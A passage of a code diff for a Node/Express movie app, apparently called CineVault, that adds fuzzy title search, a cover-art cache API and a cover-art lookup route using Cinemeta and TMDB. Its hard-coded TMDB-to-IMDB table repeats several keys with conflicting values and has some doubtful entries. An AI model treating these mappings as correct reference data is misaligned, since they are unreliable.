+  if (title.startsWith(q)) return 900;
+  if (title.includes(q)) return 800 - Math.max(0, title.length - q.length);
+  const aliases = (entry.aliases || []).map(normalizeMovieDbText);
+  if (aliases.some(a => a === q)) return 950;
+  if (aliases.some(a => a.startsWith(q) || a.includes(q))) return 850;
+  const qWords = q.split(/\s+/).filter(Boolean);
+  const tWords = title.split(/\s+/).filter(Boolean);
+  let score = 0;
+  let overlap = 0;
+  for (const word of qWords) {
+    let best = 0;
+    for (const tw of tWords) {
+      if (tw === word) best = Math.max(best, 160);
+      else if (tw.startsWith(word) || word.startsWith(tw)) best = Math.max(best, 130);
+      if (tw === word) overlap++;
+    }
+    score += best;
+  }
+  const aliasHit = aliases.some(a => movieDbTokenize(a).some(tok => qWords.includes(tok))) ? 40 : 0;
+  const dotHit = movieDbAliasVariants(title).some(v => v.includes(q.replace(/\s+/g, ''))) ? 60 : 0;
+  const coverage = qWords.length ? Math.round((overlap / qWords.length) * 100) : 0;
+  return qWords.length ? Math.round(score / qWords.length + aliasHit + dotHit + coverage / 2) : 0;
+}
+
+function normalizeSearchText(value) {
+  return String(value || '')
+    .toLowerCase()
+    .replace(/&/g, ' and ')
+    .replace(/[^a-z0-9]+/g, ' ')
+    .trim();
+}
+
+function searchTextWords(value) {
+  return normalizeSearchText(value)
+    .split(/\s+/)
+    .filter(Boolean)
+    .filter(word => !['a', 'an', 'the', 'and', 'is', 'of', 'to', 'in'].includes(word));
+}
+
+const ORDINAL_ALIAS_PAIRS = [
+  ['first', '1'], ['one', '1'],
+  ['second', '2'], ['two', '2'],
+  ['third', '3'], ['three', '3'],
+  ['fourth', '4'], ['four', '4'],
+  ['fifth', '5'], ['five', '5'],
+  ['sixth', '6'], ['six', '6'],
+  ['seventh', '7'], ['seven', '7'],
+  ['eighth', '8'], ['eight', '8'],
+  ['ninth', '9'], ['nine', '9'],
+  ['tenth', '10'], ['ten', '10'],
+];
+
+function generatedSearchAliases(title) {
+  const normalized = normalizeSearchText(title);
+  if (!normalized) return [];
+  const aliases = new Set([normalized]);
+  const noThe = normalized.replace(/\bthe\b/g, ' ').replace(/\s+/g, ' ').trim();
+  if (noThe) aliases.add(noThe);
+
+  for (const [word, num] of ORDINAL_ALIAS_PAIRS) {
+    if (normalized.includes(word)) {
+      aliases.add(normalized.replace(new RegExp(`\\b${word}\\b`, 'g'), num).replace(/\s+/g, ' ').trim());
+    }
+    if (normalized.includes(num)) {
+      aliases.add(normalized.replace(new RegExp(`\\b${num}\\b`, 'g'), word).replace(/\s+/g, ' ').trim());
+    }
+  }
+
+  // Common sequel phrasing: "Title: Second Generation" should match "Title 2".
+  aliases.add(normalized.replace(/\bsecond generation\b/g, '2').replace(/\s+/g, ' ').trim());
+  aliases.add(normalized.replace(/\bnext generation\b/g, '2').replace(/\s+/g, ' ').trim());
+  aliases.add(normalized.replace(/\bpart two\b/g, '2').replace(/\s+/g, ' ').trim());
+  aliases.add(normalized.replace(/\bpart three\b/g, '3').replace(/\s+/g, ' ').trim());
+  aliases.add(normalized.replace(/\bchapter two\b/g, '2').replace(/\s+/g, ' ').trim());
+  aliases.add(normalized.replace(/\bchapter three\b/g, '3').replace(/\s+/g, ' ').trim());
+  return [...aliases].filter(Boolean);
+}
+
+function coverBankAliases(entry) {
+  const stored = Array.isArray(entry?.aliases) ? entry.aliases : [];
+  return [...new Set([
+    ...stored.map(normalizeSearchText),
+    ...generatedSearchAliases(entry?.title),
+  ].filter(Boolean))];
+}
+
+function searchDistance(a, b) {
+  if (!a || !b) return Math.max(a.length, b.length);
+  const prev = Array.from({ length: b.length + 1 }, (_, i) => i);
+  const curr = new Array(b.length + 1);
+  for (let i = 1; i <= a.length; i++) {
+    curr[0] = i;
+    for (let j = 1; j <= b.length; j++) {
+      curr[j] = Math.min(
+        curr[j - 1] + 1,
+        prev[j] + 1,
+        prev[j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1)
+      );
+    }
+    for (let j = 0; j <= b.length; j++) prev[j] = curr[j];
+  }
+  return prev[b.length];
+}
+
+function coverBankSearchScore(query, entry) {
+  const title = normalizeSearchText(entry?.title);
+  const aliases = coverBankAliases(entry);
+  if (!query || (!title && aliases.length === 0)) return 0;
+  if (title === query) return 1000;
+  if (title.startsWith(query)) return 900;
+  if (title.includes(query)) return 800 - Math.max(0, title.length - query.length);
+  if (aliases.some(alias => alias === query)) return 950;
+  if (aliases.some(alias => alias.startsWith(query))) return 875;
+  if (aliases.some(alias => alias.includes(query))) return 825;
+
+  const queryWords = searchTextWords(query);
+  const titleWords = searchTextWords([title, ...aliases].join(' '));
+  let score = 0;
+  for (const queryWord of queryWords) {
+    let best = 0;
+    for (const titleWord of titleWords) {
+      if (titleWord === queryWord) best = Math.max(best, 140);
+      else if (
+        (titleWord.length >= 3 && titleWord.startsWith(queryWord)) ||
+        (queryWord.length >= 3 && titleWord.length >= 3 && queryWord.startsWith(titleWord))
+      ) best = Math.max(best, 115);
+      else {
+        const distance = searchDistance(queryWord, titleWord);
+        const allowed = queryWord.length <= 4 ? 1 : queryWord.length <= 7 ? 2 : 3;
+        if (distance <= allowed) best = Math.max(best, 95 - distance * 15);
+      }
+    }
+    score += best;
+  }
+  return queryWords.length ? Math.round(score / queryWords.length) : 0;
+}
+
+function coverBankSearchIsRealMatch(query, entry) {
+  const title = normalizeSearchText(entry?.title);
+  const aliases = coverBankAliases(entry);
+  if (!query || (!title && aliases.length === 0)) return false;
+  if (title === query || title.startsWith(query) || title.includes(query)) return true;
+  if (aliases.some(alias => alias === query || alias.startsWith(query) || alias.includes(query))) return true;
+  const queryWords = searchTextWords(query);
+  const titleWords = searchTextWords([title, ...aliases].join(' '));
+  return queryWords.every(word =>
+    titleWords.some(titleWord =>
+      titleWord === word ||
+      (word.length >= 3 && titleWord.startsWith(word)) ||
+      (word.length >= 3 && word.startsWith(titleWord))
+    )
+  );
+}
+
+// GET /api/cover-bank — Look up a title's cached cover art
+// ?title=<title>&year=<year>  OR  ?id=<tmdbId>  OR  ?all=1 (dump entire bank)
+app.get('/api/cover-bank', (req, res) => {
+  const bank = readCoverBank();
+
+  // Dump entire bank for client prewarm
+  if (req.query.all === '1') {
+    if (!_coverBankAllJson) {
+      const bank = readCoverBank();
+      _coverBankAllJson = JSON.stringify({ entries: bank, count: Object.keys(bank).length });
+    }
+    res.setHeader('Cache-Control', 'public, max-age=300');
+    res.setHeader('Content-Type', 'application/json');
+    return res.send(_coverBankAllJson);
+  }
+
+  // Search by title substring
+  if (req.query.search) {
+    const q = normalizeSearchText(req.query.search);
+    const results = {};
+    Object.entries(bank)
+      .map(([k, v]) => ({ k, v, score: coverBankSearchScore(q, v) }))
+      .filter(hit => coverBankSearchIsRealMatch(q, hit.v))
+      .filter(hit => hit.score >= 70 && !hit.v.redirect)
+      .sort((a, b) => {
+        if (b.score !== a.score) return b.score - a.score;
+        return parseInt(b.v.year || 0) - parseInt(a.v.year || 0);
+      })
+      .slice(0, 80)
+      .forEach(hit => { results[hit.k] = hit.v; });
+    return res.json(results);
+  }
+
+  const { title, year, id } = req.query;
+  let key = '';
+  if (id) {
+    key = `tmdb_${id}`;
+  } else if (title) {
+    key = `${title.toLowerCase().replace(/[^a-z0-9]/g, '')}_${year || ''}`;
+  } else {
+    return res.status(400).json({ error: 'Provide ?title= or ?id= or ?all=1' });
+  }
+  const entry = bank[key];
+  if (entry) {
+    res.json({ found: true, key, ...entry });
+  } else {
+    res.json({ found: false, key });
+  }
+});
+
+app.get('/api/movie-db', (req, res) => {
+  const q = String(req.query.q || '').trim();
+  const limit = Math.max(1, Math.min(parseInt(req.query.limit) || 80, 200));
+  const entries = readMovieDb();
+  if (!q) {
+    return res.json({ entries: entries.slice(0, limit), count: entries.length });
+  }
+  const scored = entries
+    .map(entry => ({ entry, score: movieDbSearchScore(q, entry) }))
+    .filter(hit => hit.score >= 80)
+    .sort((a, b) => b.score - a.score || String(a.entry.title).localeCompare(String(b.entry.title)))
+    .slice(0, limit)
+    .map(hit => hit.entry);
+  res.json({ entries: scored, count: scored.length, query: q });
+});
+
+// POST /api/cover-bank — Save cover art to the memory bank
+app.post('/api/cover-bank', (req, res) => {
+  const { key, poster, backdrop, dvdCover, source, tmdbId, id, imdbId, title, year, releaseDate, type, aliases } = req.body;
+  if (!key) return res.status(400).json({ error: 'Missing key' });
+  const bank = readCoverBank();
+  bank[key] = {
+    id: id || tmdbId || imdbId || null,
+    poster: poster || null,
+    backdrop: backdrop || null,
+    dvdCover: dvdCover || null,
+    source: source || 'unknown',
+    tmdbId: tmdbId || null,
+    imdbId: imdbId || null,
+    title: title || '',
+    year: year || '',
+    releaseDate: releaseDate || '',
+    type: type || 'movie',
+    aliases: Array.isArray(aliases) ? aliases.filter(Boolean) : [],
+    updatedAt: new Date().toISOString(),
+  };
+  writeCoverBank(bank);
+  res.json({ ok: true, key, entry: bank[key] });
+});
+
+// ═══════════════════════════════════════════
+//  /api/cover-art — Search for DVD cover/poster art
+//  ?title=<movie title>&year=<year>&type=<movie|tv>&tmdb_id=<id>
+//  Searches Cinemeta (free, no key), TMDB, OMDb, and web sources
+//  Auto-saves to cover art memory bank on success
+// ═══════════════════════════════════════════
+const OMDB_API_KEY = process.env.OMDB_API_KEY || 'trilogy';  // Free key, 1000/day
+const TMDB_API_KEY = process.env.TMDB_API_KEY || '';  // Optional
+
+app.get('/api/cover-art', async (req, res) => {
+  const { title = '', year = '', type = 'movie', tmdb_id = '' } = req.query;
+  if (!title && !tmdb_id) return res.status(400).json({ error: 'Missing ?title= or ?tmdb_id= parameter' });
+
+  const cacheKey = `cover:${title}:${year}:${type}:${tmdb_id}`;
+  const cached = getCached(cacheKey);
+  if (cached) return res.json(cached);
+
+  const results = {
+    title: title || `TMDB ${tmdb_id}`,
+    year,
+    type,
+    poster: null,       // Best poster URL found
+    backdrop: null,     // Best backdrop/fanart URL
+    dvdCover: null,     // DVD-style cover (wider aspect)
+    tmdbData: null,
+    omdbData: null,
+    sources: [],
+  };
+
+  // 0. Resolve TMDB ID to IMDB ID + title via multiple strategies
+  let imdbId = null;
+  let resolvedTitle = title || '';
+  try {
+    if (tmdb_id) {
+      const cinType = type === 'tv' ? 'series' : 'movie';
+
+      // 0pre. Check TMDB-to-IMDB mapping table for known shows/movies (ALWAYS check map first)
+      // Comprehensive TMDB → IMDB mapping (verified May 2026)
+      // Covers all curated franchise/genre IDs from curated.js
+      const TMDB_TO_IMDB_MAP = {
+      // Auto-enriched TMDB->IMDB mapping (updated 2026-05-20)
+        '10330': 'tt0120693',  // Half Baked (1998)
+        '12': 'tt0266543',
+        '21': 'tt0060371',
+        '24': 'tt0266697',
+        '26': 'tt0352994',
+        '62': 'tt0062622',
+        '8': 'tt0088763',
+        '9': 'tt0096874',
+        '10': 'tt0099088',
+        '11': 'tt0076759',
+        '13': 'tt0109830',
+        '22': 'tt0325980',
+        '58': 'tt0383574',
+        '85': 'tt0082971',
+        '86': 'tt0084467',
+        '87': 'tt0097576',
+        '93': 'tt0120382',
+        '223702': 'tt1700841',
+        '122081': 'tt2101441',
+        '1339713': 'tt37287335',
+        '2292': 'tt0109445',
+        '2293': 'tt0113749',
+        '2255': 'tt0118842',
+        '1832': 'tt0120655',
+        '2294': 'tt0261392',
+        '2295': 'tt0424345',
+        '158011': 'tt2783020',
+        '446159': 'tt6521876',
+        '635731': 'tt11128440',
+        '98': 'tt0172495',
+        '120': 'tt0167220',
+        '121': 'tt0120737',
+        '122': 'tt0167260',
+        '155': 'tt0468569',
+        '165': 'tt1853728',
+        '194': 'tt0064116',
+        '218': 'tt0088247',
+        '238': 'tt0068646',
+        '268': 'tt0096895',
+        '272': 'tt0372784',
+        '278': 'tt0111161',
+        '287': 'tt0449088',
+        '303': 'tt1298650',
+        '329': 'tt0107290',
+        '330': 'tt0119567',
+        '331': 'tt0163025',
+        '335': 'tt0367882',
+        '346': 'tt0245429',
+        '348': 'tt1345836',
+        '366': 'tt0095016',
+        '367': 'tt0097121',
+        '368': 'tt0106919',
+        '369': 'tt0337978',
+        '399': 'tt0409345',
+        '411': 'tt0317705',
+        '414': 'tt0103776',
+        '419': 'tt0072241',
+        '424': 'tt0108052',
+        '497': 'tt0120689',
+        '532': 'tt0441773',
+        '539': 'tt0054215',
+        '557': 'tt0145487',
+        '558': 'tt0413300',
+        '559': 'tt0413300',
+        '572': 'tt0081502',
+        '584': 'tt0322259',
+        '585': 'tt0463985',
+        '590': 'tt0098904',  // Seinfeld
+        '594': 'tt0338013',
+        '603': 'tt0133093',
+        '604': 'tt0234215',
+        '605': 'tt0242633',
+        '608': 'tt0119654',
+        '609': 'tt0120912',
+        '610': 'tt11161328',
+        '631': 'tt0087800',
+        '656': 'tt0057076',
+        '659': 'tt0114369',
+        '670': 'tt0063522',
+        '671': 'tt0075753',
+        '672': 'tt0066760',
+        '680': 'tt0110912',
+        '686': 'tt0062512',
+        '687': 'tt0078348',
+        '693': 'tt0064997',
+        '707': 'tt0082966',
+        '710': 'tt0055928',
+        '722': 'tt0086006',
+        '769': 'tt0099685',
+        '809': 'tt0298148',
+        '810': 'tt0356302',
+        '812': 'tt0126029',
+        '862': 'tt0114709',
+        '863': 'tt0211915',
+        '920': 'tt0351280',
+        '947': 'tt0232500',
+        '954': 'tt0117060',
+        '956': 'tt0120755',
+        '957': 'tt0317919',
+        '958': 'tt1229238',
+        '1100': 'tt0364845',  // NCIS
+        '1396': 'tt0903747',  // Breaking Bad
+        '1399': 'tt0944947',  // Game of Thrones
+        '1429': 'tt2560140',  // Attack on Titan
+        '1434': 'tt0182576',  // Family Guy
+        '1622': 'tt1475582',  // Sherlock
+        '1668': 'tt0108778',  // Friends
+        '1771': 'tt0371746',
+        '1891': 'tt0080684',
+        '1892': 'tt0086190',
+        '1893': 'tt0120915',
+        '1894': 'tt0121765',
+        '1895': 'tt0121766',
+        '2001': 'tt0418279',
+        '2002': 'tt1055369',
+        '2003': 'tt1399107',
+        '2105': 'tt0367379',
+        '2190': 'tt0121955',  // South Park
+        '2287': 'tt0459282',
+        '2316': 'tt0386676',  // The Office
+        '2396': 'tt0075148',
+        '2397': 'tt0084602',
+        '2398': 'tt0086106',
+        '2399': 'tt0086828',
+        '2402': 'tt0116629',
+        '2478': 'tt0773262',  // Dexter
+        '2615': 'tt0627713',  // Law & Order: SVU
+        '2734': 'tt0098844',  // Law & Order
+        '3691': 'tt0100507',
+        '3692': 'tt3076658',
+        '3982': 'tt0066921',
+        '4087': 'tt0407934',  // Forensic Files
+        '4614': 'tt0452046',  // Criminal Minds
+        '4626': 'tt0395843',  // CSI: NY
+        '4935': 'tt0198781',
+        '4951': 'tt0458339',
+        '6934': 'tt0187578',
+        '8587': 'tt0268380',
+        '8588': 'tt0298148',
+        '8592': 'tt0988994',  // Naruto
+        '10023': 'tt0800080',
+        '10193': 'tt0435761',
+        '10340': 'tt0892791',
+        '10721': 'tt0438488',
+        '10764': 'tt0117729',
+        '10766': 'tt0143145',
+        '10778': 'tt0180093',
+        '12291': 'tt0903624',
+        '12971': 'tt0121220',  // Dragon Ball Z
+        '13811': 'tt1596343',
+        '24428': 'tt0910936',
+        '27205': 'tt0434409',
+        '31911': 'tt2176448',  // My Hero Academia
+        '37854': 'tt0105521',  // One Piece
+        '41421': 'tt18689192',
+        '43964': 'tt10762530',
+        '45793': 'tt2467372',  // Brooklyn Nine-Nine
+        '46260': 'tt0436992',  // Doctor Who
+        '48891': 'tt6904164',  // The Good Place
+        '49026': 'tt2310208',
+        '49051': 'tt1170308',
+        '51439': 'tt1905041',
+        '53423': 'tt0184302',
+        '53647': 'tt7631050',
+        '55316': 'tt3560060',  // CSI: Cyber
+        '57243': 'tt1856010',  // House of Cards
+        '60059': 'tt3032476',
+        '60573': 'tt2085059',  // Black Mirror
+        '60625': 'tt2861424',  // Rick and Morty
+        '62104': 'tt2306299',  // Vikings
+        '62710': 'tt4555364',  // Knightfall
+        '64688': 'tt0381061',
+        '66732': 'tt4574334',  // Stranger Things
+        '67158': 'tt0409445',  // Cops
+        '67195': 'tt0475784',  // Westworld
+        '67915': 'tt7188460',  // The Witcher
+        '68721': 'tt2015381',
+        '70160': 'tt1392170',
+        '70161': 'tt1951264',
+        '70162': 'tt1951265',
+        '70163': 'tt1951266',
+        '70524': 'tt11198330',
+        '70536': 'tt1164004',  // Dark
+        '70548': 'tt3470660',  // Cobra Kai
+        '71446': 'tt2189541',  // Gravity Falls
+        '71663': 'tt5632644',  // Live PD
+        '71912': 'tt5071412',  // Ozark
+        '76338': 'tt0848228',
+        '76479': 'tt1190634',  // The Boys
+        '77169': 'tt3322312',  // Daredevil
+        '82819': 'tt7492444',  // The Umbrella Academy
+        '82856': 'tt3475110',  // Peaky Blinders
+        '84958': 'tt10919380',
+        '85271': 'tt9114286',
+        '85968': 'tt11952106',  // Panic
+        '87101': 'tt3459600',
+        '88396': 'tt10234724',  // Falcon & Winter Soldier
+        '89826': 'tt13276828',  // 61st Street
+        '93405': 'tt10986410',
+        '93484': 'tt24667526',  // Loki
+        '94555': 'tt13377012',  // Accused
+        '94605': 'tt10285328',
+        '95396': 'tt11214590',
+        '100088': 'tt4154796',
+        '100283': 'tt11021606',  // Jujutsu Kaisen
+        '102022': 'tt11773998',  // CSI: Vegas
+        '102610': 'tt10872600',
+        '102611': 'tt2250912',
+        '103516': 'tt12708542',  // Star Wars: Bad Batch
+        '104281': 'tt10979628',  // Demon Slayer
+        '125141': 'tt11641290',  // Spy x Family
+        '157336': 'tt0816692',
+        '168259': 'tt2810892',
+        '181808': 'tt2488496',
+        '181812': 'tt2527338',
+        '202250': 'tt14472576',  // Criminal Minds: Evolution
+        '245891': 'tt2911666',
+        '281338': 'tt4630562',
+        '284052': 'tt2096673',
+        '293660': 'tt1431045',
+        '299534': 'tt4154756',
+        '299536': 'tt4154664',
+        '302694': 'tt4425200',
+        '324549': 'tt4633694',
+        '324552': 'tt9362722',
+        '326473': 'tt1979376',
+        '329869': 'tt0369610',
+        '330459': 'tt2527336',
+        '335784': 'tt14627758',
+        '337339': 'tt2380307',
+        '338761': 'tt1790808',
+        '348350': 'tt3748528',
+        '351286': 'tt4881806',
+        '354912': 'tt3783958',
+        '359516': 'tt2381249',
+        '361197': 'tt1074638',
+        '361743': 'tt3498820',
+        '370913': 'tt10838180',
+        '372658': 'tt3104988',
+        '385687': 'tt5433138',
+        '420818': 'tt0478970',
+        '429617': 'tt2395427',
+        '440922': 'tt18778302',
+        '457232': 'tt10762530',
+        '458156': 'tt6148156',
+        '495764': 'tt0478970',
+        '496243': 'tt6751668',
+        '497698': 'tt9114286',
+        '508439': 'tt8041270',
+        '508943': 'tt4154756',
+        '527771': 'tt9376612',
+        '533535': 'tt6263850',
+        '566525': 'tt4154796',
+        '577922': 'tt4605584',
+        '580489': 'tt10872600',
+        '603692': 'tt10648342',
+        '616037': 'tt20623616',
+        '618344': 'tt1642449',
+        '624860': 'tt10838180',
+        '634649': 'tt2106476',
+        '668460': 'tt9764362',
+        '705861': 'tt9032400',
+        '714166': 'tt5805712',
+        '748822': 'tt10366206',
+        // --- Batch add 2026-05-20: 55 more TMDB→IMDB mappings ---
+        '89': 'tt0097576',
+        '254': 'tt0360717',
+        '266': 'tt0057345',
+        '274': 'tt0102926',
+        '500': 'tt0105236',
+        '550': 'tt0137523',
+        '637': 'tt0118799',
+        '650': 'tt0101507',
+        '679': 'tt0090605',
+        '681': 'tt0066995',
+        '824': 'tt0203009',
+        '887': 'tt0036868',
+        '921': 'tt0352248',
+        '946': 'tt0040536',
+        '1492': 'tt0103594',
+        '1585': 'tt0038650',
+        '2004': 'tt0177882',
+        '4470': 'tt0136461',
+        '4971': 'tt2872732',
+        '8589': 'tt0408472',
+        '9476': 'tt0183790',
+        '9480': 'tt3322312',
+        '9483': 'tt0388395',
+        '10138': 'tt1228705',
+        '10273': 'tt6304046',
+        '10702': 'tt3696720',
+        '11216': 'tt0095765',
+        '11574': 'tt0065051',
+        '11594': 'tt0116583',
+        '263115': 'tt3315342',
+        '278154': 'tt3416828',
+        '290859': 'tt6450804',
+        '299537': 'tt4154664',
+        '326291': 'tt3253734',
+        '383498': 'tt5463162',
+        '40011': 'tt0117420',
+        '407201': 'tt4467194',
+        '408529': 'tt3761946',
+        '408826': 'tt0091007',
+        '438799': 'tt4530422',
+        '444489': 'tt0165374',
+        '447365': 'tt6791350',
+        '46610': 'tt2117962',
+        '471574': 'tt6228896',
+        '48883': 'tt0043824',
+        '50619': 'tt1324999',
+        '568124': 'tt2953050',
+        '653346': 'tt11389872',
+        '82674': 'tt1291671',
+        '91314': 'tt2109248',
+        '135397': 'tt0369610',
+        // National Lampoon franchise
+        '545': 'tt0085995',    // Vacation (1983)
+        '11104': 'tt0089670',  // European Vacation (1985)
+        '10729': 'tt0097958',  // Christmas Vacation (1989)
+        '43964': 'tt0118995',  // Vegas Vacation (1997)
+        '551': 'tt0077975',    // Animal House (1978)
+        '43967': 'tt0283111',  // Van Wilder (2002)
+        '43965': 'tt0107659',  // Loaded Weapon 1 (1993)
+        // ── NEW FRANCHISES (added 2026-05-28) ──
+        '2501': 'tt0258463',   // The Bourne Identity
+        '2502': 'tt0372183',   // The Bourne Supremacy
+        '2503': 'tt0440963',   // The Bourne Ultimatum
+        '2504': 'tt1194173',   // The Bourne Legacy
+        '8681': 'tt0936501',   // Taken
+        '82675': 'tt1397280',  // Taken 2
+        '1586047': 'tt2446042', // Taken 3
+        '161': 'tt0240772',    // Ocean's Eleven
+        '163': 'tt0349903',    // Ocean's Twelve
+        '164': 'tt0496806',    // Ocean's Thirteen
+        '176': 'tt0387564',    // Saw
+        '215': 'tt0432348',    // Saw II
+        '1576': 'tt0489270',   // Saw III
+        '1577': 'tt0890870',   // Saw IV
+        '1578': 'tt1233227',   // Saw V
+        '1579': 'tt1232829',   // Saw VI
+        '1580': 'tt1477834',   // Saw 3D
+        '1581': 'tt7137380',   // Jigsaw
+        '1582': 'tt8760708',   // Spiral
+        '346364': 'tt1396484', // It (2017)
+        '474350': 'tt7349950', // It Chapter Two
+        '87421': 'tt0092099',  // Top Gun
+        '361743': 'tt1745960', // Top Gun: Maverick
+        '76341': 'tt1392190',  // Mad Max: Fury Road
+        '1015163': 'tt12037194', // Furiosa
+        '312221': 'tt3076658', // Creed
+        '396535': 'tt6343314', // Creed II
+        '614933': 'tt11145118', // Creed III
+        '315634': 'tt2250912', // Spider-Man: Homecoming
+        '429617': 'tt6320628', // Spider-Man: Far From Home
+        '634649': 'tt10872600', // Spider-Man: No Way Home
+        '131631': 'tt1392170', // The Hunger Games
+        '131634': 'tt1951264', // Catching Fire
+        '131635': 'tt1951265', // Mockingjay Part 1
+        '131636': 'tt1951266', // Mockingjay Part 2
+        '445671': 'tt10545296', // Ballad of Songbirds & Snakes
+        '129': 'tt0245429',    // Spirited Away
+        '124': 'tt0347149',    // Howl's Moving Castle
+        '5140': 'tt0087544',   // Nausicaa
+        '4935': 'tt0096283',   // My Neighbor Totoro
+        '2210': 'tt0093779',   // Castle in the Sky
+        '10393': 'tt0347149',  // Howl's (dup)
+        '20530': 'tt0347149',  // Howl's (dup)
+        '496243': 'tt6751668', // Parasite
+        '258023': 'tt4016934', // Train to Busan
+        '843278': 'tt8178634', // Decision to Leave
+        '68718': 'tt0816692',  // Interstellar
+        '872585': 'tt14444798', // Oppenheimer
+        '693134': 'tt1160419', // Dune: Part Two
+        '1022789': 'tt22022452', // Inside Out 2
+        '823463': 'tt5765844', // Godzilla x Kong
+        '945961': 'tt18412256', // Alien: Romulus
+        '956837': 'tt18412256', // Alien: Romulus (dup)
+        '533535': 'tt6263850', // Deadpool & Wolverine
+        '324857': 'tt4633694', // Spider-Man: Into the Spider-Verse
+        '616037': 'tt9362722', // Spider-Man: Across the Spider-Verse
+        '109445': 'tt2294629', // Frozen
+        '330457': 'tt4520988', // Frozen II
+        '127380': 'tt2277860', // Finding Dory
+        '585': 'tt0198781',    // Monsters, Inc.
+        '586': 'tt0892782',    // Monsters University
+        '10191': 'tt0892769',  // How to Train Your Dragon
+        '512113': 'tt1646971', // How to Train Your Dragon 2
+        '920': 'tt0317705',    // The Incredibles
+        '926': 'tt3606756',    // Incredibles 2
+        '324549': 'tt1872181', // The Amazing Spider-Man
+        '324552': 'tt2250912', // The Amazing Spider-Man 2
+        '10345': 'tt1038988',  // [REC]
+        '10346': 'tt1242460',  // [REC] 2
+        '10347': 'tt1649443',  // [REC] 3
+        '7216': 'tt0293508',   // The Transporter
+        '7217': 'tt0443935',   // Transporter 2
+        '7218': 'tt0814314',   // Transporter 3
+        '979': 'tt0232500',    // The Fast and the Furious
+        '9799': 'tt0322259',   // 2 Fast 2 Furious
+        '260513': 'tt0463985', // Fast Five
+        '260514': 'tt1905041', // Fast & Furious 6
+        '260515': 'tt2820852', // Furious 7
+        '168258': 'tt4630562', // The Fate of the Furious
+        '124905': 'tt0056775', // Godzilla (1954)
+        '480530': 'tt5580390', // Midsommar
+        '42517': 'tt0361748',  // Inglourious Basterds
+        '111': 'tt0068646',    // The Godfather (alt id)
+        '240': 'tt0071562',    // The Godfather Part II (alt id)
+        '324786': 'tt3076658', // Creed (alt id)
+        '566525': 'tt11138512', // Prey (Predator)
+        '106': 'tt0093773',    // Predator
+        '701814': 'tt11564570', // Host (2020)
+        '313369': 'tt3783958', // La La Land
+        '597': 'tt0120338',    // Titanic
+        '857': 'tt0120815',    // Saving Private Ryan
+        '1094': 'tt0078788',   // Apocalypse Now
+        '115': 'tt0107048',    // Groundhog Day
+        '5965': 'tt0107048',   // Groundhog Day (alt)
+        '54339': 'tt0107048',  // Groundhog Day (alt)
+        '72162': 'tt0107048',  // Groundhog Day (alt)
+        '136497': 'tt1375666', // Inception (alt)
+        '1075200': 'tt10954600', // Thunderbolts
+        '939333': 'tt21692408', // Alien: Romulus (alt)
+        '92607': 'tt0816692',  // Interstellar (alt)
+        '68718': 'tt0816692',  // Interstellar (alt2)
+      };
+      if (TMDB_TO_IMDB_MAP[String(tmdb_id)]) {
+        imdbId = TMDB_TO_IMDB_MAP[String(tmdb_id)];
+        console.log(`[COVER-ART] TMDB-to-IMDB mapping hit: tmdb=${tmdb_id} → imdb=${imdbId}`);
+      }
+
+      // 0a. Try Cinemeta search to resolve TMDB ID → IMDB ID + title
+      // Use the tmdb: prefix format that Cinemeta understands for ID-based lookups
+      if (!imdbId) {
+        const cinemetaSearchUrl = `https://v3-cinemeta.strem.io/search/${encodeURIComponent('tmdb' + tmdb_id)}.json`;
+        const searchRes = await fetch(cinemetaSearchUrl, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(8000) });
+        if (searchRes.ok) {
+          const searchData = await searchRes.json();
+          if (searchData?.results?.length) {
+            // Filter results to match the requested type
+            const typeMatch = searchData.results.filter(r => {
+              const rType = (r.type || '').toLowerCase();
+              return type === 'tv' ? rType === 'series' : rType === 'movie';
+            });
+            const best = typeMatch[0] || searchData.results[0];
+            imdbId = best.imdb_id || best.id || null;
+            resolvedTitle = best.name || best.title || best.original_title || '';
+            if (!results.title || results.title.startsWith('TMDB')) results.title = resolvedTitle;
+          }
+        }
+      }
+
+      // 0a2. Try Cinemeta meta endpoint with tmdb: prefix format directly
+      if (!imdbId) {
+        try {
+          const tmdbPrefixUrl = `https://v3-cinemeta.strem.io/meta/${cinType}/tmdb${tmdb_id}.json`;
+          const tmdbPrefixRes = await fetch(tmdbPrefixUrl, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(8000) });
+          if (tmdbPrefixRes.ok) {
+            const tmdbPrefixData = await tmdbPrefixRes.json();
+            const meta = tmdbPrefixData?.meta;
+            if (meta) {
+              imdbId = meta.imdb_id || meta.id || null;
+              resolvedTitle = meta.name || meta.title || '';
+              if (!results.title || results.title.startsWith('TMDB')) results.title = resolvedTitle;
+            }
+          }
+        } catch {}
+      }
+
+      // 0b. Try Cinemeta stream endpoint (sometimes carries IMDB ID in behaviorHints)
+      if (!imdbId) {
+        const streamUrl = `https://v3-cinemeta.strem.io/stream/${cinType}/${tmdb_id}.json`;
+        const streamRes = await fetch(streamUrl, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(8000) });
+        if (streamRes.ok) {
+          const streamData = await streamRes.json();
+          const strmId = streamData?.streams?.[0]?.behaviorHints?.imdbId;
+          if (strmId) imdbId = strmId;
+        }
+      }
+
+      // 0c. Try TMDB API direct lookup by ID (if API key available) to get title
+      if (!resolvedTitle && TMDB_API_KEY) {
+        const tmdbDirectUrl = `https://api.themoviedb.org/3/${type === 'tv' ? 'tv' : 'movie'}/${tmdb_id}?api_key=${TMDB_API_KEY}`;
+        const tmdbDirectRes = await fetch(tmdbDirectUrl, { headers: { 'User-Agent': 'CineVault/2.0' }, signal: AbortSignal.timeout(8000) });
+        if (tmdbDirectRes.ok) {
+          const tmdbDirectData = await tmdbDirectRes.json();
+          if (tmdbDirectData.title || tmdbDirectData.name) {
+            resolvedTitle = tmdbDirectData.title || tmdbDirectData.name;
+            if (!results.title || results.title.startsWith('TMDB')) results.title = resolvedTitle;
+          }
+          // Grab poster/backdrop from TMDB direct lookup immediately
+          if (tmdbDirectData.poster_path) {
+            const tmdbPoster = `https://image.tmdb.org/t/p/w500${tmdbDirectData.poster_path}`;
+            if (!results.poster) results.poster = tmdbPoster;
+            results.sources.push({ source: 'tmdb-direct', type: 'poster', url: tmdbPoster });
+          }
+          if (tmdbDirectData.backdrop_path && !results.backdrop) {
+            const tmdbBackdrop = `https://image.tmdb.org/t/p/original${tmdbDirectData.backdrop_path}`;
+            results.backdrop = tmdbBackdrop;
+            results.sources.push({ source: 'tmdb-direct', type: 'backdrop', url: tmdbBackdrop });
+          }
+          if (!results.tmdbData) {
